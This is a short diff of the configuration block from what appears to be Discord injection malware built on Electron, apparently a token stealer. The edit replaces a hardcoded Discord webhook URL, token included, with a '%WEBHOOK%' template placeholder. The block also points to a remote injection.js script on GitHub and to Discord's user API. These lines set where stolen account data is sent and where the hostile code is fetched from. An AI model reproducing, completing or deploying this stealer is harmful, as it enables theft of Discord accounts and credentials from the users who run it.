@@ -5,7 +5,7 @@ const path = require('path');
 const { BrowserWindow, session, net } = require('electron');
 
 const CONFIG = {
-    webhook: "https://discord.com/api/webhooks/1481832539910836246/kGb769zFD7y8KDN-sTTRRXq9RCOJKiaja2G1FsYkdeHva2-kWakJ2sk8xxlwcnDB87_A",
+    webhook: "%WEBHOOK%",
     injection_url: "https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js",
     API: "https://discord.com/api/v9/users/@me",
     filters: {
